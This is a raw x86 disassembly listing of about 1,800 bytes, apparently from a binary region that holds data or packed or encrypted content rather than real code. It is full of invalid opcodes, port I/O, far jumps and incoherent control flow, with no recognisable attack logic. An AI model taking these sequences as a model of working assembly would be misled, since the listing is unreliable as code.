  402f61:	push   edx
  402f62:	adc    cl,al
  402f64:	call   0xdbd2:0x4fb9575d
  402f6b:	ret    
  402f6c:	leave  
  402f6d:	jmp    0x402fb2
  402f6f:	ds adc al,0x30
  402f72:	mov    esi,DWORD PTR [ecx]
  402f74:	sub    eax,0x45286dfc
  402f79:	ret    0x1fb
  402f7c:	push   0xf327e943
  402f81:	imul   ebp,edx,0xffffffb6
  402f84:	in     eax,0x55
  402f86:	popa   
  402f87:	in     eax,0xb
  402f89:	xchg   edi,eax
  402f8a:	pop    ss
  402f8b:	sbb    bl,0x24
  402f8e:	add    eax,0xd87a29ee
  402f93:	mov    ebp,0xe5586baa
  402f98:	fnstenv [esi]
  402f9a:	jnp    0x402f7c
  402f9c:	mov    ah,0xaf
  402f9e:	cmp    eax,0xc305b800
  402fa3:	jmp    0x402fb5
  402fa5:	hlt    
  402fa6:	fdivr  st(0),st
  402fa8:	out    dx,al
  402fa9:	(bad)  
  402faa:	push   esp
  402fab:	popf   
  402fac:	adc    bh,dh
  402fae:	(bad)  
  402faf:	xchg   ebp,eax
  402fb0:	je     0x402f85
  402fb2:	int    0x4b
  402fb4:	data16 adc cl,BYTE PTR [edi-0x75e3df0b]
  402fbb:	call   0x8c7d:0x13d20e5
  402fc2:	mov    dh,0xef
  402fc4:	out    dx,al
  402fc5:	jmp    DWORD PTR [esi]
  402fc7:	stc    
  402fc8:	test   al,0x7c
  402fca:	out    dx,eax
  402fcb:	iret   
  402fcc:	push   edi
  402fcd:	xor    ah,BYTE PTR [edx+0x13]
  402fd0:	ficomp WORD PTR [ebp-0x68933d6c]
  402fd6:	inc    ecx
  402fd7:	lods   al,BYTE PTR ds:[esi]
  402fd8:	mov    esp,0x6b527f0
  402fdd:	sbb    DWORD PTR [edx+0x6a],edi
  402fe0:	stos   BYTE PTR es:[edi],al
  402fe1:	mov    ah,0x7
  402fe3:	add    ecx,DWORD PTR [eax]
  402fe5:	pop    eax
  402fe6:	scas   eax,DWORD PTR es:[edi]
  402fe7:	jmp    0x41717df8
  402fec:	xchg   DWORD PTR [ebx+eiz*1+0x29],eax
  402ff0:	push   ebx
  402ff1:	test   eax,0x6e5e2f3c
  402ff6:	arpl   si,si
  402ff8:	adc    cl,BYTE PTR [edx+0x2121d845]
  402ffe:	rcl    DWORD PTR [ebp-0x25],1
  403001:	loope  0x402f98
  403003:	out    0x4,eax
  403005:	cmp    cl,BYTE PTR [ecx+0xc27cd62]
  40300b:	adc    DWORD PTR [edx-0x67],ecx
  40300e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40300f:	call   0x53cb:0x958236a5
  403016:	and    ah,ch
  403018:	xor    BYTE PTR [edi-0x27776665],al
  40301e:	(bad)  
  40301f:	and    edx,DWORD PTR [ebx-0x772cf78d]
  403025:	sub    ch,BYTE PTR [edx-0x65]
  403028:	xchg   esp,eax
  403029:	cmp    BYTE PTR [ecx],0x5
  40302c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40302d:	pop    ds
  40302e:	lahf   
  40302f:	pop    esi
  403030:	mov    esp,0x7d1aacc0
  403035:	faddp  st(1),st
  403037:	mov    esp,0x81b1149c
  40303c:	dec    eax
  40303d:	or     al,0xc9
  40303f:	jge    0x403037
  403041:	mov    ds:0x7338ac13,eax
  403046:	adc    eax,0xbb4d7fa9
  40304b:	rol    BYTE PTR [esi+0x70],0x7e
  40304f:	or     eax,0x871d7187
  403054:	and    eax,0xbc9381b6
  403059:	inc    edi
  40305a:	jno    0x4030a7
  40305c:	dec    ebx
  40305d:	push   es
  40305e:	hlt    
  40305f:	(bad)
  403062:	xor    DWORD PTR [ebx-0x5a],edi
  403065:	retf   0xeb19
  403068:	test   BYTE PTR [ebp-0xe],al
  40306b:	pushf  
  40306c:	push   ebx
  40306d:	and    DWORD PTR [edx+ebx*8],esp
  403070:	pop    esi
  403071:	pusha  
  403072:	addr16 push ebx
  403074:	jbe    0x4030cc
  403076:	loopne 0x4030de
  403078:	add    eax,0xd3634ed5
  40307d:	cli    
  40307e:	pusha  
  40307f:	cmp    BYTE PTR [edi+edx*1+0x312611a5],bh
  403086:	sub    eax,0x29efd8d4
  40308b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40308d:	out    dx,eax
  40308e:	in     al,0xe
  403090:	ret    0xc918
  403093:	jp     0x4030d5
  403095:	sub    dh,BYTE PTR [eax]
  403097:	jo     0x403062
  403099:	pop    esi
  40309a:	adc    al,0x1a
  40309c:	leave  
  40309d:	test   eax,0xd7e3903f
  4030a2:	dec    edi
  4030a3:	jnp    0x40303b
  4030a5:	stos   DWORD PTR es:[edi],eax
  4030a6:	rcl    DWORD PTR [ebx],1
  4030a8:	bound  esp,QWORD PTR [eax]
  4030aa:	xchg   ebx,eax
  4030ab:	dec    ebp
  4030ac:	dec    edx
  4030ad:	push   edx
  4030ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030af:	push   esi
  4030b0:	push   es
  4030b1:	mov    ebp,0xd0e9d9cc
  4030b6:	sbb    dl,bh
  4030b8:	pop    ds
  4030b9:	repz adc BYTE PTR [bp+di-0x275f],ah
  4030bf:	sar    DWORD PTR [ebx+0x3d],0x84
  4030c3:	add    ch,BYTE PTR [edi]
  4030c5:	sub    ecx,DWORD PTR [ecx-0x57]
  4030c8:	popf   
  4030c9:	mov    ch,0x91
  4030cb:	icebp  
  4030cc:	jbe    0x40308c
  4030ce:	imul   edx,DWORD PTR [edi-0x6c],0x74bf8b05
  4030d5:	or     dl,BYTE PTR [ecx+0x2b730a5a]
  4030db:	mov    gs,ebp
  4030dd:	mov    al,ds:0xc1817616
  4030e2:	xchg   esp,eax
  4030e3:	(bad)
  4030e6:	push   esi
  4030e7:	pusha  
  4030e8:	pop    eax
  4030e9:	inc    ebp
  4030ea:	les    ecx,FWORD PTR [ebx+eiz*2]
  4030ed:	jo     0x403159
  4030ef:	adc    al,0xa
  4030f1:	sub    ebx,eax
  4030f3:	and    DWORD PTR [ebp-0x3d],0xffffffbe
  4030f7:	mov    DWORD PTR [ecx-0x52],ebp
  4030fa:	and    edi,DWORD PTR [esi]
  4030fc:	into   
  4030fd:	repz inc ebx
  4030ff:	or     esp,DWORD PTR [ecx+esi*8]
  403102:	mov    ebp,0xa028a9db
  403107:	fadd   st,st(1)
  403109:	inc    edx
  40310a:	aas    
  40310b:	and    esp,edx
  40310d:	jle    0x403174
  40310f:	stos   DWORD PTR es:[edi],eax
  403110:	adc    ah,BYTE PTR [ebp-0x5cec7f6d]
  403116:	fist   DWORD PTR [ebx]
  403118:	push   es
  403119:	dec    ecx
  40311a:	xor    dl,dh
  40311c:	push   ebx
  40311d:	pop    ss
  40311e:	sub    al,0x68
  403120:	cwde   
  403121:	ja     0x403169
  403123:	es out 0x35,al
  403126:	clc    
  403127:	add    bh,bh
  403129:	ins    BYTE PTR es:[edi],dx
  40312a:	xor    eax,0x407239ee
  40312f:	jb     0x4030cd
  403131:	and    dh,bl
  403133:	int    0x36
  403135:	and    BYTE PTR [eax+0x48],dh
  403138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403139:	xlat   BYTE PTR ds:[ebx]
  40313a:	repnz enter 0xffde,0xdf
  40313f:	push   ebp
  403140:	jge    0x4030e9
  403142:	mov    ch,0x4f
  403144:	jg     0x4030da
  403146:	call   0xf0102abf
  40314b:	and    DWORD PTR [ebx+0x2560d0fd],0x7e
  403152:	adc    DWORD PTR [ebp+0x25],eax
  403155:	loop   0x40310a
  403157:	or     DWORD PTR [esi],esp
  403159:	lea    esi,[ecx+0x8f03976]
  40315f:	mov    eax,ds:0x863c630
  403164:	les    ebp,FWORD PTR [edx+ebp*1]
  403167:	les    edx,FWORD PTR [eax-0x11687fe5]
  40316d:	in     al,0xb9
  40316f:	xchg   edi,eax
  403170:	lock cld 
  403172:	call   FWORD PTR [ebx-0x39]
  403175:	mov    ds:0xeb81e202,eax
  40317a:	mov    ebp,0x51e32d3a
  40317f:	daa    
  403180:	call   0xa361:0x29c35461
  403187:	push   ss
  403188:	clc    
  403189:	shl    DWORD PTR [eax-0xd49a522],1
  40318f:	sbb    DWORD PTR [esi+0xfa6a6d0],0x60
  403196:	jnp    0x40320e
  403198:	scas   al,BYTE PTR es:[edi]
  403199:	mov    eax,ds:0xaaf9ebc5
  40319e:	sbb    DWORD PTR [esi+edx*2],esp
  4031a1:	in     eax,dx
  4031a2:	mov    ebx,0x554f5100
  4031a7:	call   0x38c79957
  4031ac:	int    0x51
  4031ae:	xchg   ecx,eax
  4031af:	fidivr DWORD PTR [ebp+0x1d9d9069]
  4031b5:	fs cwde 
  4031b7:	cli    
  4031b8:	test   al,0x56
  4031ba:	push   edx
  4031bb:	imul   ebp,DWORD PTR [esi+ebx*4+0x4d9822d9],0xffffffdc
  4031c3:	jb     0x403172
  4031c5:	push   esi
  4031c6:	adc    eax,0xf6829980
  4031cb:	out    dx,al
  4031cc:	fs test eax,0x90dfc563
  4031d2:	mov    eax,ds:0x354c77c1
  4031d7:	xchg   edx,eax
  4031d8:	imul   esp,DWORD PTR [eax-0x63],0xffffff83
  4031dc:	mov    al,ds:0x763d1d18
  4031e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031e2:	in     eax,dx
  4031e3:	sbb    DWORD PTR [ebx],0xffffffda
  4031e6:	adc    al,0xf0
  4031e8:	aad    0xd4
  4031ea:	pop    eax
  4031eb:	les    edx,FWORD PTR [ebp+0x31]
  4031ee:	sub    DWORD PTR ds:0x5137d89b,ebp
  4031f4:	xor    eax,0x9b06e3c6
  4031f9:	and    DWORD PTR [esi-0x2f],ecx
  4031fc:	loopne 0x40323e
  4031fe:	adc    al,0xe3
  403200:	jne    0x4031ab
  403202:	or     DWORD PTR [eax+eax*4-0x6c27d602],0xffffffb8
  40320a:	int    0x9d
  40320c:	push   ecx
  40320d:	sar    DWORD PTR [edx],cl
  40320f:	or     eax,0xcf381f6b
  403214:	mov    ah,BYTE PTR [ecx]
  403216:	xor    DWORD PTR ds:0xd3753a04,ecx
  40321c:	stos   DWORD PTR es:[edi],eax
  40321d:	inc    ebp
  40321e:	pop    es
  40321f:	mov    eax,ds:0xbfbb870e
  403224:	mov    dh,0xea
  403226:	xor    DWORD PTR [esi+0x4a],edi
  403229:	mov    BYTE PTR [eax],ch
  40322b:	push   ds
  40322c:	fisttp WORD PTR [edi-0x71]
  40322f:	cmp    al,dh
  403231:	pop    esi
  403232:	xchg   ebx,esi
  403234:	in     eax,0xd9
  403236:	mov    ah,0xd7
  403238:	test   eax,0xbf0404a
  40323d:	adc    edx,DWORD PTR [edx]
  40323f:	xlat   BYTE PTR ds:[ebx]
  403240:	and    DWORD PTR [esi],edx
  403242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403243:	mov    WORD PTR [edx-0x79],gs
  403246:	lahf   
  403247:	repz and BYTE PTR [ecx],bh
  40324a:	xchg   ebp,eax
  40324b:	cmp    edi,eax
  40324d:	jno    0x4032a0
  40324f:	faddp  st(0),st
  403251:	adc    DWORD PTR [eax-0x51],edi
  403254:	push   es
  403255:	dec    edi
  403256:	sub    eax,0xa52b31b
  40325b:	or     al,bh
  40325d:	cs mov dh,0x2
  403260:	loope  0x403296
  403262:	pop    ebp
  403263:	dec    edi
  403264:	cmp    cl,BYTE PTR [ecx+edi*4-0xd72a279]
  40326b:	jg     0x40322d
  40326d:	fcomp  QWORD PTR [edx+edx*4+0x3b]
  403271:	mov    esp,0x42aa7164
  403276:	mov    ds:0xe1b9dd46,eax
  40327b:	add    ah,ch
  40327d:	int    0x33
  40327f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403280:	dec    ebx
  403281:	pop    es
  403282:	dec    ebp
  403283:	test   al,0xd4
  403285:	push   esi
  403286:	xor    DWORD PTR [ebx+0x3635ad9e],edi
  40328c:	lock out dx,eax
  40328e:	and    BYTE PTR ss:[ebx+ebp*2-0x37],bh
  403293:	cmp    eax,0x7e98a7f0
  403298:	jmp    0xcbe4:0x7fece933
  40329f:	push   ebx
  4032a0:	jb     0x4032fb
  4032a2:	sub    esi,ebp
  4032a4:	test   eax,0x6ebfdbeb
  4032a9:	jmp    0x4032c2
  4032ab:	inc    edi
  4032ac:	xor    BYTE PTR [edi+0x35694481],al
  4032b2:	cdq    
  4032b3:	mov    WORD PTR ds:0xa3bf43a1,ss
  4032b9:	adc    BYTE PTR [edx],dl
  4032bb:	mov    eax,0xc81dca3f
  4032c0:	mov    bh,0x9e
  4032c2:	(bad)  
  4032c3:	leave  
  4032c4:	mov    dh,cl
  4032c6:	cmp    dh,cl
  4032c8:	cmp    eax,0xe8a3de76
  4032cd:	leave  
  4032ce:	inc    esi
  4032cf:	xor    al,0xa7
  4032d1:	dec    ebp
  4032d2:	adc    edi,DWORD PTR ds:0xbd735b69
  4032d8:	xchg   DWORD PTR [eax],ebx
  4032da:	lock add bh,BYTE PTR [edx-0x39]
  4032de:	xchg   DWORD PTR [ebx-0xe053422],eax
  4032e4:	xchg   esp,eax
  4032e5:	add    BYTE PTR [eax-0x343e476a],0x22
  4032ec:	(bad)  
  4032ed:	enter  0x97c,0x8
  4032f1:	retf   
  4032f2:	scas   eax,DWORD PTR es:[edi]
  4032f3:	adc    ebp,esp
  4032f5:	lahf   
  4032f6:	ret    0x69e3
  4032f9:	push   ebx
  4032fa:	or     al,0xcf
  4032fc:	mov    dl,0x8b
  4032fe:	nop
  4032ff:	cmp    al,0xb
  403301:	test   eax,0x14a53c35
  403306:	xor    edx,ebp
  403308:	(bad)  
  40330a:	call   FWORD PTR [eax+0x18]
  40330d:	sub    BYTE PTR [eax-0x13b34bc],0xb6
  403314:	xchg   ebp,eax
  403315:	jge    0x40332d
  403317:	mov    esp,0xd2349b5e
  40331c:	fmulp  st(2),st
  40331e:	pop    ds
  40331f:	aad    0x68
  403321:	push   edx
  403322:	sti    
  403323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403324:	jecxz  0x403310
  403326:	lods   al,BYTE PTR ds:[esi]
  403327:	jle    0x40335f
  403329:	fst    QWORD PTR [ecx-0x2830ec72]
  40332f:	call   DWORD PTR [ebp+0x46feaa16]
  403335:	dec    ebx
  403336:	add    cl,BYTE PTR [edx]
  403338:	ins    BYTE PTR es:[edi],dx
  403339:	add    DWORD PTR [esi],ebp
  40333b:	hlt    
  40333c:	and    edi,esi
  40333e:	mov    DWORD PTR [ebp-0x77],ebp
  403341:	xor    eax,0xff1f3c06
  403346:	xchg   edx,eax
  403347:	push   ds
  403348:	mov    BYTE PTR [edi-0x588da6be],al
  40334e:	jl     0x403343
  403350:	or     eax,0xbe231b85
  403355:	sti    
  403356:	push   edx
  403357:	cmova  ebx,DWORD PTR [ebp-0x5a]
  40335b:	pop    esi
  40335c:	mov    eax,0x1fc460c5
  403361:	jns    0x40338c
  403363:	xor    BYTE PTR [edx],ch
  403365:	xchg   bl,ch
  403367:	retf   0x90ee
  40336a:	xor    eax,0x57a4e77
  40336f:	sub    eax,0x29dbd5ea
  403374:	mov    eax,cr1
  403377:	cmp    eax,0x5e3b64a3
  40337c:	mov    ds:0x9ace2d91,al
  403381:	inc    edi
  403382:	outs   dx,BYTE PTR ds:[esi]
  403383:	sbb    dl,0x77
  403386:	popf   
  403387:	jp     0x403317
  403389:	outs   dx,DWORD PTR ds:[esi]
  40338a:	xchg   esi,eax
  40338b:	sbb    bh,ah
  40338d:	xchg   dl,cl
  40338f:	sbb    eax,0xe31c9b46
  403394:	dec    esp
  403395:	mov    ch,0x7f
  403397:	ins    BYTE PTR es:[edi],dx
  403398:	fwait
  403399:	pop    edi
  40339a:	ins    BYTE PTR es:[edi],dx
  40339b:	pslld  mm4,QWORD PTR [ecx+0xa]
  40339f:	mov    edx,0x148eaf9b
  4033a4:	cli    
  4033a5:	push   ecx
  4033a6:	test   DWORD PTR [edx+0x197ad1e2],ebp
  4033ac:	mov    cl,BYTE PTR [esp+esi*8-0x4f]
  4033b0:	imul   ebx,DWORD PTR [edi+0x35940e77],0x48ab5bbf
  4033ba:	fstp   st(6)
  4033bc:	pusha  
  4033bd:	lea    ebp,[ecx+0x52]
  4033c0:	ficomp DWORD PTR [esi-0x1e]
  4033c3:	stos   DWORD PTR es:[edi],eax
  4033c4:	and    BYTE PTR [ecx],ch
  4033c6:	push   es
  4033c7:	imul   edx,DWORD PTR [edx],0x28d8e2f9
  4033cd:	mov    dh,0xc4
  4033cf:	repz mov ds:0xf7168b4e,eax
  4033d5:	jnp    0x40338b
  4033d7:	xor    al,0xb1
  4033d9:	inc    edx
  4033da:	out    0x7f,eax
  4033dc:	fcmovnu st,st(2)
  4033de:	or     DWORD PTR [eax-0x118943fd],ecx
  4033e4:	inc    edi
  4033e5:	add    al,0x71
  4033e7:	aad    0x2d
  4033e9:	imul   eax,DWORD PTR [edx-0x25],0x45
  4033ed:	push   es
  4033ee:	adc    cl,cl
  4033f0:	mov    bl,0x7c
  4033f2:	into   
  4033f3:	nop
  4033f4:	or     al,0xbd
  4033f6:	lock leave 
  4033f8:	adc    DWORD PTR [eax+0x4c],ecx
  4033fb:	sbb    DWORD PTR [edi+0x6f0593ed],ebp
  403401:	popa   
  403402:	shl    ecx,0x46
  403405:	mov    edx,0xb1bb2de6
  40340a:	aaa    
  40340b:	adc    ch,BYTE PTR [ebx]
  40340d:	inc    ebp
  40340e:	sub    DWORD PTR [ebx],esp
  403410:	cmp    bh,BYTE PTR [ecx+0x5]
  403413:	in     al,0xd6
  403415:	sub    eax,0xc961e513
  40341a:	cmp    al,0xf
  40341c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40341d:	mov    eax,0x83c2556
  403422:	lea    eax,ds:0x73b62d5c
  403428:	mov    ecx,0x1df5afb1
  40342d:	sahf   
  40342e:	jo     0x4033db
  403430:	or     esp,edx
  403432:	imul   ebx,DWORD PTR [edi-0x2cb7f07b],0x71
  403439:	cmp    esp,DWORD PTR [ebx+0x26dbba4b]
  40343f:	add    cl,BYTE PTR [esi+0x128f4f64]
  403445:	pop    edx
  403446:	jmp    0xb57b:0xdd5b51da
  40344d:	std    
  40344e:	rcr    ebp,1
  403450:	inc    edi
  403451:	ins    BYTE PTR es:[edi],dx
  403452:	ins    DWORD PTR es:[edi],dx
  403453:	cwde   
  403454:	test   DWORD PTR [esi],0x441889cb
  40345a:	and    ah,bh
  40345c:	retf   
  40345d:	xchg   BYTE PTR [eax+0x748f560d],dh
  403463:	add    eax,edi
  403465:	sub    ebx,DWORD PTR [edx]
  403467:	call   0xea3f:0xd761a45e
  40346e:	je     0x403486
  403470:	or     edi,DWORD PTR [edx-0x3713a159]
  403476:	ins    BYTE PTR es:[edi],dx
  403477:	adc    BYTE PTR [eax+ebx*1-0x17],dh
  40347b:	sbb    DWORD PTR [eax+0x1f],edi
  40347e:	dec    edi
  40347f:	mul    bh
  403481:	cmp    eax,0xb41033c5
  403486:	rol    DWORD PTR [ebx-0x431a82a5],cl
  40348c:	mov    ecx,0xd1292599
  403491:	lea    esp,[esp+ebx*2-0x333449e3]
  403498:	sub    ah,bh
  40349a:	dec    esi
  40349b:	lods   eax,DWORD PTR ds:[esi]
  40349c:	and    DWORD PTR ss:[ebp+0x2b],esp
  4034a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034a1:	push   ebp
  4034a2:	dec    ebx
  4034a3:	sbb    DWORD PTR ds:0x82d4cd6d,ebx
  4034a9:	leave  
  4034aa:	call   0x63ee:0x35d9c7e3
  4034b1:	cmp    DWORD PTR [ecx-0x78],eax
  4034b4:	ret    
  4034b5:	adc    BYTE PTR [ecx-0x1dc13875],0x90
  4034bc:	dec    edx
  4034bd:	jmp    0x4a2e625d
  4034c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034c3:	adc    DWORD PTR [eax-0x7f],edi
  4034c6:	adc    edx,0xea59c054
  4034cc:	(bad)  [esi-0x66]
  4034cf:	adc    esp,edx
  4034d1:	mov    edi,edi
  4034d3:	push   es
  4034d4:	mov    ds:0xbbf59d68,al
  4034d9:	push   edx
  4034da:	cdq    
  4034db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034dc:	rcr    BYTE PTR [ebp-0xa],0xe8
  4034e0:	dec    ebx
  4034e1:	mov    edi,0xf688a40c
  4034e6:	pusha  
  4034e7:	push   esi
  4034e8:	inc    esi
  4034e9:	inc    esp
  4034ea:	push   ebp
  4034eb:	fnsave [esi-0x2c]
  4034ee:	push   ecx
  4034ef:	clc    
  4034f0:	repz jae 0x403497
  4034f3:	sub    al,bl
  4034f5:	out    dx,eax
  4034f6:	or     ah,al
  4034f8:	loop   0x40355a
  4034fa:	arpl   WORD PTR [esp+ecx*4+0x154cdec6],ax
  403501:	inc    eax
  403502:	nop
  403503:	xor    eax,0x8bbd81f2
  403508:	mov    ebx,0x401e2ef9
  40350d:	es sbb esi,esi
  403510:	dec    eax
  403511:	jnp    0x4034c3
  403513:	xchg   edx,eax
  403514:	daa    
  403515:	xlat   BYTE PTR ds:[ebx]
  403516:	mov    esp,0xa4617396
  40351b:	shl    DWORD PTR [ecx+0xef6d273],0xd3
  403522:	or     BYTE PTR [ecx-0x4e],cl
  403525:	test   DWORD PTR [edi-0x6d],ecx
  403528:	scas   al,BYTE PTR es:[edi]
  403529:	jmp    0x29ff:0x5c47efe0
  403530:	add    eax,0x3cf4d6b
  403535:	jae    0x403513
  403537:	cmp    eax,0xb4e3e32
  40353c:	pop    esp
  40353d:	pop    esp
  40353e:	pushf  
  40353f:	cmp    BYTE PTR [eax+esi*4+0x27097183],ah
  403546:	call   FWORD PTR [eax]
  403548:	shr    BYTE PTR [eax+0x61],cl
  40354b:	jl     0x403544
  40354d:	mov    ecx,0x639f9333
  403552:	in     al,0x6f
  403554:	mov    edi,0x13573b7d
  403559:	jns    0x40352d
  40355b:	push   ebx
  40355c:	arpl   WORD PTR [ecx+0x38f81d68],bp
  403562:	and    eax,0x85f1cdc4
  403567:	aaa    
  403568:	xor    BYTE PTR [ebp+esi*2-0x68837eb9],bh
  40356f:	pop    ss
  403570:	adc    DWORD PTR [edi+0x6a26e794],esi
  403576:	xor    BYTE PTR [ecx+0x2f],bh
  403579:	xchg   edx,eax
  40357a:	leave  
  40357b:	mov    BYTE PTR [ecx+0x1f],al
  40357e:	inc    edi
  40357f:	pop    edx
  403580:	jmp    0x404b57fd
  403585:	dec    edx
  403586:	ss xor al,0xab
  403589:	mov    ebx,DWORD PTR [esi+0x4a]
  40358c:	out    dx,al
  40358d:	add    dl,dh
  40358f:	or     bl,bh
  403591:	je     0x40360f
  403593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403594:	mov    bl,0x41
  403596:	in     al,dx
  403597:	jb     0x403561
  403599:	enter  0xd97c,0x98
  40359d:	jg     0x403618
  40359f:	cmp    DWORD PTR [ebx+0x13],0xe9123085
  4035a6:	mov    eax,ds:0xc5e6d40f
  4035ab:	arpl   WORD PTR [edx-0x21],ax
  4035ae:	bound  eax,QWORD PTR [ecx-0x79de3e69]
  4035b4:	sub    DWORD PTR [ebx+0x411a1cd8],eax
  4035ba:	jge    0x403565
  4035bc:	or     DWORD PTR [ebx-0x5a],0x5b
  4035c0:	fist   WORD PTR [ebx-0x68fd6298]
  4035c6:	arpl   WORD PTR [edx],di
  4035c8:	les    ebx,FWORD PTR [ecx-0x73]
  4035cb:	mov    ebp,0xb351e054
  4035d0:	xor    BYTE PTR [ebx],bh
  4035d2:	dec    edx
  4035d3:	pop    ebp
  4035d4:	jmp    0xbb02bc0
  4035d9:	hlt    
  4035da:	adc    BYTE PTR [ebx+0x3a],dh
  4035dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035de:	daa    
  4035df:	daa    
  4035e0:	push   es
  4035e1:	sar    DWORD PTR [edi-0x44],0x81
  4035e5:	hlt    
  4035e6:	jmp    0x43da:0x367f87a1
  4035ed:	push   eax
  4035ee:	cld    
  4035ef:	js     0x403645
  4035f1:	pop    esi
  4035f2:	push   es
  4035f3:	lea    eax,[ecx+0x50]
  4035f6:	pop    ebp
  4035f7:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4035f9:	inc    edx
  4035fa:	inc    edx
  4035fb:	or     eax,0x65a0f338
  403600:	fsubr  DWORD PTR [edx-0x6d0c9488]
  403606:	int3   
  403607:	in     al,dx
  403608:	in     al,0x4d
  40360a:	ja     0x40359f
  40360c:	cmp    esp,eax
  40360e:	into   
  40360f:	je     0x403658
  403611:	jmp    0x4bb64893
  403616:	fbld   TBYTE PTR [ebx]
  403618:	aas    
  403619:	sub    BYTE PTR [ecx-0x3c40bd87],0xaf
  403620:	es popa 
  403622:	ja     0x4035e9
  403624:	or     esi,DWORD PTR [edi-0x8e059c]
  40362a:	ja     0x4036a0
  40362c:	pop    eax
  40362d:	bound  eax,QWORD PTR [esi+0x332c6ab6]
  403633:	pop    eax
  403634:	idiv   DWORD PTR [esi-0x148b9f95]
  40363a:	jne    0x403690
  40363c:	sub    eax,0x2a2905b9
  403641:	das    
  403642:	mov    edx,0xff729ca
  403647:	xlat   BYTE PTR ds:[ebx]
  403648:	lds    edx,FWORD PTR [ebx+0x24f45407]
  40364e:	das    
  40364f:	stos   DWORD PTR es:[edi],eax
  403650:	pushf  
  403651:	nop
  403652:	cmp    eax,0x25c18321
  403657:	mov    dl,0x1e
  403659:	add    BYTE PTR [edi-0x79],ch
  40365c:	pop    ebp
  40365d:	cld    
  40365e:	test   al,0x39
  403660:	xchg   ecx,eax
  403661:	add    esi,DWORD PTR [eax+eax*1]
  403664:	data16 or al,0xa0
  403667:	repnz push edx
  403669:	repz sbb eax,edi
  40366c:	cmp    DWORD PTR [edi+0x37],esi
  40366f:	fsub   QWORD PTR [edx+ebx*8-0x42]
  403673:	loop   0x40367f
  403675:	mov    edx,0xd9930c9b
  40367a:	mov    eax,0x47fc22f7
  40367f:	mov    ch,0xe1
  403681:	scas   al,BYTE PTR es:[edi]
  403682:	jge    0x40362a
  403684:	pushf  
  403685:	out    0x59,al
  403687:	bound  eax,QWORD PTR [edi-0x53]
  40368a:	push   esi
  40368b:	xor    al,0xcb
  40368d:	sub    BYTE PTR [ebx-0x28fbbe45],bh
  403693:	cmp    al,0x94
  403695:	add    al,0xd3
  403697:	jns    0x403630
  403699:	in     eax,dx
  40369a:	push   ebp
  40369b:	jb     0x4036f0
  40369d:	call   0x75ff:0x1be5c8
  4036a4:	imul   edi,DWORD PTR [edi+0x77],0x5e
  4036a8:	sub    al,BYTE PTR [eax]
  4036aa:	int3   
  4036ab:	aad    0x1d
  4036ad:	es aas 
  4036af:	mov    ds:0xce9261cd,al
  4036b4:	sbb    al,0x19
  4036b6:	pop    esp
  4036b8:	out    0xbf,al
  4036ba:	lods   al,BYTE PTR ds:[esi]
  4036bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036bc:	push   edx
  4036bd:	sbb    BYTE PTR [edi],dh
  4036bf:	loope  0x403655
  4036c1:	mov    cl,0x5c
  4036c3:	mov    al,0xc3
  4036c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036c6:	pop    es
  4036c7:	pop    eax
  4036c8:	repz jl 0x40371a
  4036cb:	mov    DWORD PTR [edx+0x21],edx
  4036ce:	iret   
  4036cf:	pop    es
  4036d0:	sub    DWORD PTR [ecx-0x225065d3],ecx
  4036d6:	aam    0xbe
  4036d8:	lods   al,BYTE PTR ds:[esi]
  4036d9:	dec    ebx
  4036da:	(bad)  
  4036dc:	xor    DWORD PTR [edx+0x26d28804],edx
  4036e2:	xchg   ebx,eax
  4036e3:	inc    edx
  4036e4:	xchg   esi,eax
  4036e5:	fdiv   st(7),st
  4036e7:	mov    edi,0x886668cf
  4036ec:	xchg   BYTE PTR ds:0xe9a490e8,cl
  4036f2:	lds    ecx,FWORD PTR [eax+0x6b]
  4036f5:	fbld   TBYTE PTR [esi+0x48]
  4036f8:	js     0x4036c9
  4036fa:	or     eax,0xee117e2b
  4036ff:	dec    edx
  403700:	sti    
  403701:	push   esp
  403702:	push   ebx
  403703:	push   esp
  403704:	mov    bh,0x4b
  403706:	push   eax
  403707:	(bad)  
  403708:	or     ebx,DWORD PTR [eax+eax*8+0x6134c8b5]
  40370f:	xchg   cl,ah
  403711:	mov    ds:0x63281426,al
  403716:	push   edx
  403717:	stos   DWORD PTR es:[edi],eax
  403718:	jle    0x403766
  40371a:	ins    BYTE PTR es:[edi],dx
  40371b:	add    eax,0x9d1a08c9
  403720:	mov    bl,0x2e
  403722:	imul   esi,DWORD PTR [esi+0x6a],0x29fe076e
  403729:	(bad)  
  40372a:	push   ecx
  40372b:	dec    ecx
  40372c:	push   ebp
  40372e:	js     0x4036f0
  403730:	popa   
  403731:	sub    edx,DWORD PTR [ecx]
  403733:	push   ebp
  403734:	inc    ebx
  403735:	fldcw  WORD PTR [edi+edx*8-0x347c65ec]
  40373c:	xor    BYTE PTR [eax+edx*1],al
  40373f:	jecxz  0x4036e4
  403741:	jmp    0x403781
  403743:	mov    esi,DWORD PTR [ebp-0x5]
  403746:	(bad)  
  403748:	repnz and eax,0xc9e98a0e
  40374e:	imul   esp,DWORD PTR [ecx+edi*4],0xfbdf86b8
  403755:	mov    ah,0x1b
  403757:	stos   BYTE PTR es:[edi],al
  403758:	fs lahf 
  40375a:	sbb    ecx,eax
  40375c:	or     DWORD PTR [esi-0x54],ebx
  40375f:	fwait
  403760:	imul   edx,DWORD PTR [eax],0x44e748cf
  403766:	dec    edx
  403767:	mov    ecx,DWORD PTR [eax+0x353da74f]
  40376d:	pop    esp
  40376e:	pop    ecx
